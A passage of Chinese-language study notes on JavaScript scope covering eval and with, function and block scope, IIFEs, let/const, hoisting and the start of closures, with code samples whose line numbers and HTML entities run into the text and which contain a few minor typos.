到所嵌套的 foo(…)的作用域中继续查找。在这里找到了 a，因为引擎使用了这个引用，对 b 来说也是一样的。对 c 来说，引擎在 bar(…)中就找到了。 如果bar(…)和 foo(…)的内部都存在一个 c,console.log(…)就可以直接使用bar(…)中的变量，而无需到外面的foo(…)查找。 作用域查找会在找到第一个匹配的标识符时停止。在多层的嵌套作用域中可以定义同名的标识符，叫做“遮蔽效应”（内部的标识符“遮蔽”了外部的标识符）。抛开遮蔽效应，作用域查找始终从运行时所处的最内部作用域开始，逐级向外或者说向上进行，知道遇到第一个匹配的标识符为止。 全局变量会自动成为全局对象（比如浏览器中的 window对象）的属性，因此可以不直接通过全局对象的词法名称，而是间接地通过对全局对象属性的应用来对其进行访问。例如：window.a 通过这种技术可以访问那些被同名变量所遮蔽的全局变量，但非全局的变量被遮蔽了，无论如何都无法被访问到。 无论函数在哪里被调用，也无论它如何被调用，它的词法作用域都只由函数被声明时所处的位置决定。词法作用域查找只会查找一级标识符，比如a、b和c。如果代码中引用了foo.bar.baz,词法作用域查找只会试图查找 foo 标识符，找到这个变量后，对象属性访问规则会分别结关对 bar 和 baz 属性的访问。 欺骗词法如果词法作用域完全由写代码期间函数所声明的位置来定义，怎样才能在运行时来“修改”（欺骗）词法作用域呢？ JavaScript 中有两种机制来实现这个目的，不过这两种机制普遍认为不是什么好主意，欺骗词法作用域会导致性能下降，解释性能之前，先说一下两种机制的原理。 evalJavaScript 中的 eval(…)函数可以接受一个字符串为参数，并将其中的内容视为好像在书写时就存在于程序中那个位置的代码。换句话说，可以在你写的代码中用程序生成代码并且运行，就像代码是写在那个位置的一样。 根据这个原理来理解 eval(…)，它是如何通过代码欺骗和假装书写时（也就是词法期）代码就在那，来实现修改修改词法作用域环境的，这个原理就变得清晰易懂了。 在执行 eval(…) 之后的代码，引擎并不知道或者是在意前面的代码是以动态形式插入进来，并对词法作用域的环境进行修改的，引擎只会如往常进行词法作用域查找 查看一下的代码： 123456function foo(str,a)&#123; eval(str); console.log(a,b);&#125;var b = 2;foo("var b = 3;",1); // 1, 3 eval(…)调用中的 “var b = 2”这段代码会被当做原来就存在那里一样来处理。由于这段代码声明了一个新的变量b,因此它对已经存在的 foo(…)的词法作用域进行了修改，事实上，和前面提到的原理一样，这段代码实际上在 foo(…)内部创建了一个 变量 b，并遮蔽了外部（全局的）作用域中的变量。 当 console.log(…)被执行的时候，会在 foo(…)内部同时找到a 和 b。但是永远也找不到外部的 b,因为会输出“1, 3”而不是 “1, 2”。 上面的例子中，为了展示的方便和简洁，我们传递进去的代码字符串是固定不变的，而在实际情况中，可以非常容易地根据程序逻辑动态地将字符拼接在一起之后再传递进去。eval(…)通常被用来执行动态创建的代码，因为像例子中那样动态地执行一段固定字符所组成的代码，并没有比直接将代码写在那里有好处 默认情况下，eval(…)中所执行的代码包含一个或者多个声明（无论是变量还是函数），就会对 eval(…)所处的词法作用域进行修改，技术上，通过一些技巧可以间接地调用 eval(…)来使其运行在全局作用域中，并对全局作用域进行修改。但无论何种情况，eval(…)都可以在运行期间修改书写期的词法作用域。 在严格模式的程序中，eval(…)在运行时尤其自己的词法作用域，意味着其中的声明无法修改所在的作用域 123456function foo(str)&#123; "use strict" eval(str); console.log(a); // ReferenceError: a is not defined&#125;foo("var a = 2"); JavaScript 中还有其他一些功能效果和 eval(…)很相似。setTimeout 和 setInterval 的第一个参数可以为字符串，字符串的内容可以解释为一段动态生成的函数代码，这些功能已经过时了并不被提倡了，不要使用。 new Function(…)函数的行为也很类似，最后一个参数可以接受代码字符串，并将其转化成动态生成的函数。这种构建函数的语法比较 eval 略微安全一点。但也要尽量避免使用。在程序汇中动态生成代码的使用场景很罕见，因为它所带来的好处无法抵消性能上的损耗。 withJavaScript 另外一个难以掌握的现在也不推荐使用的用来欺骗词法作用域的功能是with 关键字。可以有很多方法来解释 with。这里用这个角度来解释：它如何同被它所影响的词法作用域进行交互 with 通常被当做重复引用同一个对象中的多个属性的快捷方式，可以不需要重复引用对象本身。 比如： 12345678910111213141516171819202122232425262728293031323334353637var obj = &#123; a:1, b:2, c:3&#125;// 单调乏味的重复 “obj”obj.a = 2;obj.b = 3;obj.c = 4;// 简单的快捷方式with(obj)&#123; a = 3; b = 4; c = 5;&#125;// 但实际上这不仅仅是为了方便地访问对象属性。思考一下代码：function foo(obj)&#123; with(obj)&#123; a = 2; &#125;&#125;var o1 = &#123; a:3&#125;var o2 =&#123; b:3&#125;foo(o1);o1.a; // 2foo(o2)o2.a; // undefineda // 2——不好，a 被泄露到全局作用域上了// 上面这个例子中创建 o1 和 o2 两个对象，其中一个有 a 的属性，另外一个没有。foo(...)函数接受了一个 obj 参数，这个参数是一个对象的引用，并对这个对象引用执行了 with(obj)&#123;..&#125;。这 with 块内部，代码看起来只是对变量 a进行简单的词法引用，实际上是一个 LHS 查找，并将 2 赋值给它。// 当我们将 o1传递进去，a = 2 赋值操作找到了 o1.a并将2赋值给它。而 o2中没有a属性，因为不会创建这个属性，保持 undefined。至于实际上 a = 2赋值操作创建了一个全局的变量 a 是因为 with 可以将一个没有或有多个属性的对象处理成一个完全隔离的词法作用域，因为这个对象的属性也会被处理成定义在这个作用域中的词法标识符。 尽管 with 块可以将一个对象处理为词法作用域，但是这个块内部正常的 var 声明并不被限制在这个块的作用域中，而是被添加到 with 所处的函数作用域中。 eval(..)函数如果接受了含有一个或者多个声明的代码，就会修改所处的词法作用域，而 with 声明实际上是根据你传递给它的对象凭空创建了一个全新的词法作用域。 可以这么理解，当我们传递 o1 给 with 时，with 所声明的作用域是 o1，而这个作用域中含有一个同 o1.a 属性相符的标识符。当我们将 o2 作为作用域时，其中并没有 a 标识符，因此进行了正常的 LHS 标识符查找。 o2 的作用域、foo(…)的作用域和全局作用域都没有找到标识符 a,因此当执行 a = 2的时候，自动创建了一个全局变量（因为是非严格模式） with 这种将对象及其属性放进一个作用域并同时分配标识符的行为很让人费解。 另外一个不推荐使用 eval(…)以及 with的原因是会被严格模式所影响（限制）。with完全被禁止了，儿子啊保留核心功能的前提下，简洁或非安全地使用 eval(…)也被禁止了 性能eval(..)和 with 会在运行时候修改或者是创建新的作用域，以此来欺骗其他在书写时定义的词法作用域。 JavaScript 引擎会在编译阶段进行数项的性能优化，其中有些优化依赖能够根据代码的词法进行静态分析，并预先确定所有变量和函数的定义位置，才能在执行过程中快速找到标识符。 但如果引擎在代码中发现了上述两个方法，会简单的假设关于标识符位置的判断都是无效的。因为无法再词法分析阶段明确知道 eval(…)会接受到什么样的代码，这些代码会如何对作用域进行修改，也无法知道 传递给 with 用来创建作用域的对象的内容到底是什么。 最悲观的情况是如果出现了 eval(…)或者with，所以的优化都有可能是无意义的，因此最简单做法就是完全不需要做任何优化。 如果代码中大量使用 eval 或者是 with.那么运行起来也会非常慢。无论引擎多么聪明，试图将这些悲观情况的副作用限制在最小范围内，也无法避免如果没有这些优化，代码会运行的更慢的事实。 小结词法作用域意味着作用域是由书写代码时函数声明的位置来决定的。编译的词法分析阶段基本能够知道全部标识符在哪里已经如何声明的，从而能够预测在执行过程中如何对它们进行查找。 JavaScript 中有两个机制可以“欺骗”词法作用域：eval(..)和with。前者可以对一段包含一个或者多个声明的“代码”字符串进行演算，并借此来修改已经存在的词法作用域（在运行时）。后者本质上是通过讲一个对象的引用当做作用域来处理，将对象的属性当做作用域中的标识符来处理，从而创建了一个新的词法作用域（也是在运行中）。 这两个机制的副作用就是引擎无法在编译时对作用域查找进行优化，因为引擎只能谨慎地认为这样的优化是无效的。使用这其中一个机制都将导致代码运行变慢，所以不要使用它们。 函数作用域和块作用域正如上一章介绍一样，作用域包含了一系列的作用域，每一个都可以作为容器，其中包含了标识符（变量、函数）的定义。这些作用域互相嵌套而且整齐排列成蜂窝型，排列的结构是在写代码的时候定义的。 函数中的作用域JavaScript 具有函数的作用域，意味着每声明一个函数都为其自身创建一个子作用域，而其他结构都不会创建作用域。事实上这并不是正确的。 思考下面的代码： 12345678function foo(a)&#123; var b = 2; // 其他代码 function bar()&#123; // ... &#125; var c = 3;&#125; 上面的代码中，foo(…)的作用域包含了标识符 a、b、c 和 bar，无论标识符声明出现在作用域的什么地方，这个标识符所代表的变量或函数都附属于所处作用域。 bar(..)有用自己的作用域，全局作用域也有自己的，它只包含了一个标识符：foo 由于标识符a、b、c 和 bar 都附属 foo(…)的作用域，因为无法从 foo(…)的外部对它们进行访问，也就是说，这些标识符全部都无法从全局作用域中进行访问，因为下面的代码会导致 ReferenceError错误： 12bar(); // 失败console.log(a,b,c); // 三个全都失败 但是，这些标识符（a、b、c、foo和 bar）在 foo(…)的内部都是可以被访问的，同样在 bar(…)内部也可以被访问（假设bar(…)内部没有同名的标识符） 函数作用域的含义是指，属于这个函数的全部变量都可以在整个函数的范围内使用及重用（事实上在嵌套的作用域中也可以使用）。这种设计方案是非常有用的，能充分利用 JavaScript 变量可以根据需要改变值类型的“动态”特性。但是如果不细心处理那些可以在整个作用域范围内被访问的变量，可能会带来意想不到的问题。 隐藏内部实现对函数传统的认识就是先声明一个对象。然后向里面添加代码，但是反过来想的话，也可以有一些启示：从所写的代码中挑出一个任意的片段，然后用函数声明对它进行包装，实际上就是把这些代码给“隐藏”起来。 实际的结果结果就是在这个代码片段的周围创建一个作用域，也就是说这段代码中的任何声明 （变量或者函数）都将绑定在这个新创建的包装的函数的作用域中，而不是先前所在的作用域中。换句话说，可以把变量和函数包裹在一个函数的作用域中，然后用这个作用域来“隐藏”它们。 有很多原因促成了这种基于作用域的隐藏方法。它们大都是从最小特权原则中引申出来的，也叫做最小授权或最小暴露原则。这个原则是指在软件设计中，应该最小限度地暴露必要内容，而将其他内容都“隐藏”起来，比如某个模块或对象的 API 设计。这个原则可以延伸到如何选择作用域来包含变量和函数。如果所有变量和函数都在全局作用域中，当然可以在所有的内容嵌套作用域中访问它们。但这样会破坏前面提到的最小特权原则，因为可能会暴露过多的变量或函数，而这些变量或函数本来应该是私有的，正确的代码应该是可以阻止这些变量或函数进行访问的。 思考下面的代码： 12345678910function doSomething(a)&#123; b = a + doSomethingElse(a * 2); console.log(b * 3);&#125;function doSomethingElse(a)&#123; return a - 1;&#125;var b;doSomething(2); //15 上面的例子，变量 b 和函数 doSomethingElse(…)应该是 doSomething(…)内部具体实现的“私有“内容。给予外部作用域 对 b 和 doSomethingElse(…)的”访问权限“不仅没有必要，而且还是危险的。因为它们可能会被有意或者是无意以非预期的方式使用，从而导致了超出了 doSomething(…)的适用条件。更”合理“的设计会将这些私有的具体的内容隐藏在 doSomething(…)内容。例如： 123456789function doSomething(a)&#123; function doSomethingElse(a)&#123; return a - 1; &#125; var b; b = a + doSomethingElse(a * 2); console.log(b *3);&#125;doSomething(2); // 15 现在，b 和 doSomethingElse(…)都无法从外部被访问了，而只能被 doSomething(…)所控制。功能性和最终效果都没有受到影响，但是设计上将具体内容私有化了，设计良好的软件都会依此进行实现。 规避冲突“隐藏“作用域中的变量和函数所带来的另一个好处，是可以避免同名标识符之间的冲突，两个标识符可能具有同样的名字但用途却不一样，无意间可能会造成同名冲突，冲突会导致变量的值被意外覆盖。 1234567891011function foo()&#123; function bar(a)&#123; i = 3; // 修改 for 循环所属的作用域中的 i console.log(a + i); &#125; for(var i = 0; i &lt; 10; i++)&#123; bar(i * 2); // 槽糕，无限循环了 &#125;&#125;foo();// bar(...)内部的复制表达式 i = 3 意外地覆盖声明在 foo(...)内部 for 循环的i.这个例子将会导致无限循环，因为i 被固定设置为3，永远不会满足小于10这个条件。 bar(…)内部的赋值操作需要声明一个本地变量来使用，采用任何名字都可以，var i = 3;就可以满足这个需求（同时会为 i 声明一个前面提到的“遮蔽变量”）。另外一种方法是采用一个完全不同的标识符名称，比如：var j = 3。但是软件设计再某种情况下可能自然而然要求使用同样的标识符名称，因此在这种情况下使用作用域来“隐藏”内部声明是唯一的最佳选择。 1.全局命名空间 变量冲突的一个典型例子存在于全局作用域中。当程序中加载了多个第三方库时，如果它们没有妥善地将内部私有的函数或者变量隐藏起来，就会很容易引起冲突。 这些库通常会在全局作用域中声明一个名字足够独特的变量，通常是一个对象。这个对象被用作库的命名空间，所有需要暴露给外界的功能都会成为这个对象（命名空间）的属性，而不是将自己的标识符暴露在顶级的词法作用域中。 举个例子： 123456789var MyReallyCoolLibrary = &#123; awesome:"stuff", doSomething:function()&#123; //.. &#125;, doAnotherThing:function()&#123; //.. &#125;&#125; 2.模块管理 另外一种规避冲突的办法和现代的模块机制很接近。就是从众多的模块管理器中挑选一个来使用。使用这些工具，任何库都无需将标识符加入到全局作用域中，而是通过依赖管理器的机制将库的标识符显式地导入到另外一个特定的作用域中。这些工具没有能够违反词法作用域规则的“神奇”功能。它们只是利用作用域的规则强制所有标识符都不能注入共享作用域中，而是保存在私有、无冲突的作用域中，这样可以有效规避掉所有的意外冲突。 函数作用域现在知道了在任意代码片段外部添加包装函数，可以将内部的变量和函数定义“隐藏”起来，外部作用域无法访问包装函数内部的任何内容。 例如： 1234567var a = 2;function foo()&#123; var a = 3; console.log(a); &#125;foo(); // 3console.log(a); // 2 虽然这种技术可以解决一些问题，但是它并不理想，因为会导致一些额外的问题。首先，必须声明一个具名函数foo（）,意味着foo 这个名称本身污染了所在的作用域、其次，必须显式地通过函数名调用才可以运行里面的代码。 如果函数不需要函数名（或者至少函数名可以不污染所在的作用域），并能自动运行，这会更加理想。 123456var a =2;(function foo()&#123; var a = 3; console.log(a);&#125;)()console.log(a); 上面的例子，首先，包装函数的声明以（function… 而不仅是 function…开始。函数会被当做函数表达式而不是一个标准的函数声明来处理。 区分函数声明和表达式最简单的方法就是看 function 关键字出现在声明中的位置（不仅仅是一行代码，而是整个声明中的位置）。如果 function 是声明中的第一个词，那么就是一个函数声明，否则就是函数表达式。 函数声明和函数表达式之间最重要的区别是它们的名称标识符将会绑定在何处。比较上面那个例子，第一个中 foo 被绑定在所在的作用域中，可以直接通过 foo来调用它。第二个片段中 foo 被绑定在函数表达式自身的函数中而不是在所在作用域中。 换句话说，（function foo(){..}） 作为函数表达式意味着 foo 只能在 .. 所代表的位置中被访问，外部作用域则不行。foo 变量名被隐藏在自身中意味着不会非必要地污染外部作用域。 匿名和具名对于函数表达式最熟悉的场景就是回调函数了 123setTimeout(function()&#123; console.log('I waited 1 second!');&#125;,1000); 这叫做匿名函数表达式，因为 function()… 没有名称标识符。函数表达式可以是匿名的，而函数声明则不可以省略函数名——JavaScript 中是非法的。 匿名函数表达式书写起来简单快捷，很多库和工具也倾向于鼓励使用这种风格的代码，但是它也有几个缺点： 匿名函数在栈追踪中不会显示出意义的函数名，使得调试很困难。 如果没有函数名，当函数需要引用自身时只能使用以及过期的 arguments.callee 引用，比如在递归中。另一个函数需要引用自身的例子，是在事件触发后事件监听器需要解绑自身。 匿名函数省略了对代码可读性/可理解很重要的函数名。一个描述性的名称可以让代码不言自明。 行为函数表达式非常强大且有用——匿名和具名之间的区别并不会对这点有任何影响。给函数表达式指定一个函数名可以有效解决以上问题。始终给函数表达式命名是一个最佳实践： 123setTimeout(function timeoutHandler()&#123; console.log('I waited 1 second!');&#125;,1000); 立即执行函数表达式123456var a =2;(function foo()&#123; var a = 3; console.log(a);&#125;)()console.log(a); 由于函数被包含在一对（）括号内部，因此成为了一个表达式，通过在末尾加上另外一个（）可以立即执行函数，比如 (function(){})() 。第一个（）将函数变成表达式，第二个（）执行了这个函数。 这种模式很常见，几年前社区给它定义了一个术语IIFE，代表立即执行函数表达式（Immediately Invoked Function Expression） 函数名对 IFFE 当然不是必须的，IFFE 最常见的用法是使用一个匿名函数表达式。虽然使用具名函数的 IIFE 并不常见，但它具有上述匿名函数表达式所有的优势，因此也是一个值得推广的实践。 1234567var a =3;(function IIFE()&#123; var a = 3; console.log(a);&#125;)();console.log(a); 相较传统的 IIFE 形式，很多人都更喜欢另一个改进的形式：(function(){..}())。仔细观察其中的区别，第一种形式中函数表达式被包含在（）中，然后在后面用另一个（）括号来调用。第二种形式中用来调用的（）括号被移进了用来包装的（）括号中。 这两种形式在功能上是一致的，选择哪个全凭个人喜好 IIFE 的另一个非常普遍的进阶用法是把它们当做函数调用并传递参数进去。 例如： 1234567var a = 2;(function IIFE(global)&#123; var a = 3; console.log(a); // 3 console.log(global.a) // 2&#125;)(window)console.log(a); // 2 我们将 window 对象的引用传递进去，但将参数命名为 global，因此在代码风格上对全局对象的引用变得比引用一个没有“全局“字样的变量更加清晰。当然可以从外部作用域传递任何你需要的东西，并将变量名命名为任何你觉得适合的名字。这对改进代码风格是非常有帮助的。 这个模式的另一个应用场景是解决 undefined 标识符的默认值被错误覆盖导致的异常（虽然不常见）。讲一个参数命名为 undefined ，但是在对应的位置不传入任何值，这样就可以保证在代码块中 undefined 标识符的值真的是 undefined。 1234567undefined = true; // 不要这么做，会引起很多问题（function IIFE（undefined）&#123; var a; if(a === undefined)&#123; console.log('Undefined is safe here!'); &#125;&#125;）() IIFE 还有一种变化的用途是倒置代码的运行顺序，将要运行的函数放在第二位，在 IIFE 执行之后当做参数传递进去，这种模式在 UMD (universal Module Definition)项目中被广发使用。尽管这种模式略显冗长，但有些人认为它更容易被理解。 12345678var a = 2;(function IIFE(def)&#123; def(window)&#125;)(function def(global)&#123; var a = 3; console.log(a); // 3 console.log(global.a); // 2&#125;) 函数表达式 def 定义在片段的第二个片段，然后当作参数（这个参数也叫做 def）被传递进 IIFE函数定义的第一部分。最后，参数 def （也就是传递进去的函数）被调用，并将 window 传入当前的 global 参数的值。 块作用域尽管函数作用域最常见的作用域单元，当然也是现行大多数 JavaScript 中最普遍的设计方法，但其他类型的作用域单元也是存在的，并且通过使用其他类型的作用域单元甚至可以实现维护起来更加优秀、简洁的代码。 123for(var i = 0; i &lt; 10; i++)&#123; console.log(i);&#125; 上面例子中在 for 循环的头部直接定义了 变量 i,通常是因为只想在 for 循环内部的上下文使用 i,而忽略了 i 会被绑定在外部作用域（函数或全局）中的事实。 这个就是块作用域的作用，变量的声明应该距离使用的地方越近越好，并最大限度地本地化，另外一个例子： 123456var foo = true;if(foo)&#123; var bar = foo * 2; bar = something(bar); console.log(bar);&#125; bar 变量仅在 if 声明的上下文中使用，因为如果能将它声明在 if 块内部中会是一个很有意义的事情。但是，但是用 var 变量时，它写在哪里都是一样的，因为它们最终都会属于外部作用域。这段代码是为了风格更易读而伪装出的形式上的块作用域，如果使用这形式，要确保没在作用域其他地方意外地使用 bar 只能依靠自觉性。块作用域是一个用来对之前的最小授权原则进行扩展的工具，将代码从在函数中隐藏信息扩展为在块中隐藏信息。再次思考下面的例子： 123for(var i = 0; i &lt; 10; i++)&#123; console.log(i);&#125; 为什么要把一个只在 for 循环内部使用（至少是应该只在内部使用）的变量 i 污染到整个函数作用域中？更重要的是，开发者需要检查自己的代码，以避免在作用范围意外地使用（或复用）某些变量，如果在错误的地方使用变量将导致未知变量的异常。变量的 i 的作用域（如果存在的话）将使得其只能在 for 循环内部使用，如果在函数其他地方使用会导致错误，这对保证变量不会被混乱地复用及提升代码的可维护性都有很大帮助。 但可惜从表面上 js没有块作用域的相关功能，除非更深入地研究 withwith不仅是一个难以理解的结构，也是块作用域的一个例子（一种形式），用 with 从对象中创建出的作用域仅在 with 声明中而非外部作用域有效。 try/catchES3 规范中 try/catch 的 catch 分句会创建一个块作用域，其中声明的变量仅在 catch 内部有效。 例如： 123456try&#123; undefined(); //执行非法操作产生异常&#125;catch(err)&#123; console.log(err); // 能够正常执行&#125;console.log(err); // ReferenceError: err not found 尽管这个行为已被标准化，并且被大部分的标准 JavaScript 环境所支持，但是当同一个作用域中的两个或者多个 catch 分句用同样的标识符名称声明错误变量时，很多静态检查还是会发出警告。实际上这并不是重复定义，因为所有变量都被安全地限制在块作用域内部，但是静态检查工具还是会很烦人地发出警告 为了避免这个不必要的错误，很多开发者会将 catch 的参数命名为 err1/err2 等，也有直接关闭了静态检查工具对重复变量名的检查。 letES6 引入了新的 let 关键字，提供了除 var 以外的另一种变量声明方式。 let 关键字可以将变量绑定到所在的任意作用域中（通常是{..}内部）。换句话说，let 为其声明的变量隐式地劫持了所在的块作用域。 12345678var foo = true;if(foo)&#123; let bar = foo * 2; bar = something(bar); console.log(bar);&#125;console.log(bar) // ReferenceError 用 let 将变量附加在一个已经存在的块作用域上的行为是隐式的，在开发和修改代码的过程中，如果没有密切关注哪些作用域中有绑定变量，并且习惯地移动这些块或者将其包含在其他块中，就会导致代码的混乱。 为块作用域显式地创建块可以部分解决这个问题，是变量的附属关系变得更加清晰。通常来将，显式的代码由于隐式或一些精巧但不清晰的代码。显式的块作用域风格非常容易书写，并且和其他语言中的块作用域工作原理一样： 123456789var foo = true;if(foo)&#123; &#123; // 显式的块 let bar = foo * 2; bar = something(bar); console.log(bar); &#125;&#125;console.log(bar) // ReferenceError 只要声明是有效的，在声明中的任何位置都可以用{..}括号来为 let 创建一个用于绑定的块。这个例子中，我们在 if 声明内部显式地创建了一个块，如果需要对其进行重构，整个块都可以被方便地移动而不会对外部 if 声明的位置和语义产生任何影响。 下面会讲到提升，提升是指声明会被视为存在于其所出现的作用域的整个范围内。 但是使用 let 进行声明不会在块作用域中进行提升。声明的代码被运行之前，声明并不”存在”。 1234&#123; console.log(bar); // ReferenceError let bar = 2;&#125; 1.垃圾收集 另一个块作用域非常有用的原因和闭包及回收内存垃圾机制相关。而内部的实现，就是闭包的机制会在后面讲到。 思考下面的代码： 12345678910function process(data)&#123; // doSomething&#125;var someReallyBigData = &#123;..&#125;;process(someReallyBigData);var btn = document.getElementById('my_button');btn.addEventListener('click',function click(evt)&#123; console.log('button click');&#125;,/*capturingPhase=*/false); click 函数的点击回调并不需要 someReallyBigData 变量，理论上这意味着当 process(..)执行后，在内存中占用大量空间的数据结构就可以被垃圾回收了。但是，由于 click 函数形成了一个覆盖整个作用域的闭包，JavaScript 引擎极有可能依然保存这个结构（取决于具体实现）。 块作用域可以打消这种顾虑，可以让引擎清楚地知道没有必要继续保存 someReallyBigData了： 12345678910111213function process(data)&#123; // doSomething&#125;// 这个块中定义的内容完事就可以销毁了&#123; var someReallyBigData = &#123;..&#125;; process(someReallyBigData);&#125;var btn = document.getElementById('my_button');btn.addEventListener('click',function click(evt)&#123; console.log('button click');&#125;,/*capturingPhase=*/false); 为代码显式声明块作用域，并对变量进行本地绑定是非常有用的工具，可以把它添加到你的代码工具箱中了。 2.let循环 一个 let 循环可以发挥优势的典型例子就是之前讨论的 for 循环 1234for(let i = 0;i &lt; 10;i++)&#123; console.log(i);&#125;console.log(i); // ReferenceError for 循环头部的 let 不仅将 i 绑定到了 for 循环的块中，事实上它将其重新绑定到了循环的每一个迭代中，确保使用上一个循环迭代结束时的值重新进行赋值。下面通过另一种方式来说明迭代时进行重新绑的行为： 12345678&#123; let j; for(let i = 0;i &lt; 10;i++)&#123; let i = j; //每个迭代重新绑定 console.log(i); &#125;&#125;//由于 let 声明附属于一个新的作用域而不是当前的函数作用域（也不属于全局作用域），当代码中存在对于函数作用域中 var 声明的隐式依赖时，就会有很多隐藏的陷阱，如果用 let 来替代 var 则需要在代码重构的过程中付出额外的精力。 思考下面的代码： 123456789101112131415161718192021222324252627var foo = true, baz = 10;if(foo)&#123; var bar = 3; if(baz &gt; bar)&#123; console.log(baz) &#125;&#125;//重构为同等形式var foo = true, baz = 10;if(foo)&#123; var bar = 3; // ..&#125;if(baz &gt; bar)&#123; console.log(baz)&#125;// 但是在使用块级作用域的变量时需要注意下面的变化：var foo = true, baz = 10;if(foo)&#123; let bar = 3; if(baz &gt; bar)&#123; //移动代码不要忘了 bar console.log(baz) &#125;&#125; const除了 let 之外，ES6 还引入了 const ，统一可以用来创建块作用域变量，但其值是固定的（常量）、之后任何试图修改值的操作都会引起错误。 123456789var foo = true;if(foo)&#123; var a = 3; const b = 3; // 包含在 if中的块作用域常量 a = 3; //正常 b = 4; //错误&#125;console.log(a); // 3console.log(b); // ReferenceError 小结函数是 JavaScript 中最常见的作用域单元，本质上，声明在一个函数内部的变量或函数会在所处的作用域中“隐藏”起来，只是有意为之的良好软件的设计原则 但函数不是唯一的作用域单元。块作用域指的是变量和函数不仅可以属于所处的作用域，也可以属于某个代码块（通常指{..}内部） 从 ES3开始，try/catch 结构在 catch 分句中具有作用域。 在ES6 中引入了 let 关键字，用来在任意代码块中声明变量 1if(..)&#123;let a = 2;&#125; 上面的声明劫持了一个 if 的 {..}块的变量，并且将变量添加到这个块中。 有些人认为块作用域不应该完全作为函数作用域的替代方案。两种功能应该同时存在，开发者可以并且也应该根据需要选择使用何种作用域，创建可读、可维护的优良代码。 提升现在已经大概知道了作用域的概念，已经根据声明的位置和方式将变量分配给作用域的相关原理了。函数作用域和块作用域的行为是一样的，可以总结为：任何声明在某个作用域内的变量，都将附属这个作用域。 但是作用域同其中的变量声明出现的位置有某种微妙的关系，下面将来讨论一下这个细节。 先有鸡还是先有蛋直觉上会认为 JavaScript 代码在执行时是由上到下一行一行执行的。但实际上这并不是完全正确，有一种特殊情况会导致这个假设错误的。看下面的代码： 123a = 2;var a;console.log(a); 上面这个答案会输出什么？因为var a 声明在 a = 2之后，他们自然而然地认为变量是被重新赋值了，因此会被赋值默认值 undefined ，但是其实真正输出的结果是 2。那么下面的代码会输出什么？ 12console.log(a);var a = 2; 答案是 undefined。 编译器再度来袭之前有讲到，引擎会在解释 JavaScript 代码之前先对其进行编译。编译阶段中的一部分工作就是找到所有的声明，并用合适的作用域将它们关联起来。所有，正确的思考思路是，包括变量和函数在内的所有声明都会在任何代码被执行前首先被处理。 当你看到 var a = 2;时，可能会认为这是一个声明，但 JavaScript 实际上会将其看成两个声明：var a;和 a = 2；。第一个定义声明是在编译阶段进行的。第二个赋值声明会被留在原地等待执行阶段。 所以上面的第一段代码会被处理为： 123var a;a = 2;console.log(a); 第二段代码： 123var a;console.log(a);a = 2; 因为这个过程就像变量和函数 声明从它们在代码中出现的位置被“移动”到了最上面，这个过程就叫做提升。 换句话说，现有蛋（声明）后又鸡（赋值）。 只有声明本身会被提升，而赋值或其他运行逻辑会留在原地，如果提升改变了代码的执行的顺序，会造成非常严重的破坏。 123456789foo();function foo()&#123; console.log(a); // undefined var a = 2;&#125; foo 函数的声明（这个例子还包含实际函数的隐含值）被提升了，因此第一行中的调用可以正常执行。 另外值得注意的是，每个作用域都会进行提升操作。尽管前面大部分代码片段已经简化了（因为它们只包含全局作用域），而我们所说的 foo(…)函数自身也会在内部对 var a 进行提升（显然不是提升到整个程序的最上方）因为这段代码实际上也会被理解成下面的形式。 1234567function foo()&#123; var a; console.log(a); // undefined a = 2;&#125;foo(); 可以看到，函数声明会被提升，但是函数表达式却不会被提升 1234foo(); // 不是 RefenceError，而是 TypeError!var foo = function bar()&#123; //...&#125; 这段程序中变量标识符 foo() 被提升并分配到到所在作用域（在这里是全局作用域），因此foo()不会导致 ReferenceError,但是 foo 此时并没有被赋值（如果它是一个函数声明而不是函数表达式，那么就会赋值）foo()由于对 undefined 值进行函数调用而导致非法操作，因为抛出 TypeError 异常。同时也要记住，即使是具名的函数表达式，名称标识符在赋值之前也无法在所在作用域中使用： 12345foo(); //TypeErrorbar(); //ReferenceErrorvar foo = function bar()&#123; //...&#125; 上面的代码经过提升后，实际上会被理解成下面的形式： 1234567var foo;foo(); //TypeErrorbar(); //ReferenceErrorfoo = function bar()&#123; var bar = ...self... //...&#125; 函数优先函数声明和变量声明都会被提升，但是一个值得注意的细节（这个细节可以出现在由多个“重复”声明的代码中）是函数首先被提升了，然后才是变量。思考下面的代码： 1234567891011121314151617foo(); //1var foo;function foo()&#123; console.log(1);&#125;foo = function()&#123; console.log(2);&#125;// 为什么会输出1而不是2，是这个代码片段会被引擎理解为如下形式：foo()&#123; console.log(1);&#125;foo(); // 1foo = function()&#123; console.log(2);&#125; 注意，var foo 尽管出现在function foo(…)之前，但它是重复的声明(因此被忽略了)，因为函数声明会被提升到普通变量之前。 尽管重复的 var 声明会被忽略掉，但出现在后面的函数声明还是可以覆盖前面的。 12345678910foo(); // 3function foo()&#123; console.log(1);&#125;var foo = function()&#123; console.log(2);&#125;function foo()&#123; console.log(3);&#125; 虽然听起来都是些无用的学院理论，但是它说明了在同一个作用域中进行重复定义是非常糟糕的，而且经常会导致各种奇怪的问题。一个普通块内部的函数声明通常会被提升到所在作用域的顶部，这个过程不会像下面的代码暗示那样可以被条件判断控制： 1234567foo(); // TypeError: foo is not a functionvar a = true;if(a)&#123; function foo()&#123;console.log("a"); &#125; &#125;else&#123; function foo()&#123;console.log("b"); &#125;&#125; 但是需要注意的是这个行为并不可靠，在 JavaScript未来的版本中有可能会发生改变，因此应该尽可能避免在块内部声明函数。 小结我们习惯将var a = 2;看做一个声明，而实际上 JavaScript 引擎并不会这么认为，它将 var a 和 a = 2当做两个单独的声明，第一个是编译阶段的任务，而第二个则是执行阶段的任务。这意味着无论作用域中的声明出现在什么地方，都将在代码本身被执行前首先进行处理。可以将这个过程形象地想像成所有的声明（变量和函数）都会被“移动”到各自的作用域的最顶端，这个过程被称为提升。 声明本身会被提升，而包括函数表达式的赋值在内的赋值操作并不会被提升。要注意避免重复声明，特别是当普通的 var 声明和 函数声明混在一起的时候，否则会引起很多危险。 作用域闭包启示闭包是基于词法作用域书写代码所产生的自然结果，你甚至不需要为了利用它们而有意识地创建闭包。闭包的创建和使用在你的代码中随处可见。 实质问题当函数可以记住并访问所在词法作用域时，就产生了闭包，即使函数是在当前词法作用域之外执行。 12345678function foo()&#123; var a = 2; function bar()&#123; console.log(a); // 2 &#125; bar();&#125;foo(); 基于词法作用域的查找规则，函数 bar( ) 可以访问外部作用域中的 变量a(这个例子中是一个 RHS 引用查询) 从技术上讲，这也是一个闭包。但根据前面的定义，确切地说并不是。最准确地用来解释 bar() 对 a 的引用的方法是词法作用域的查找规则，而这些规则只是闭包的一部分。 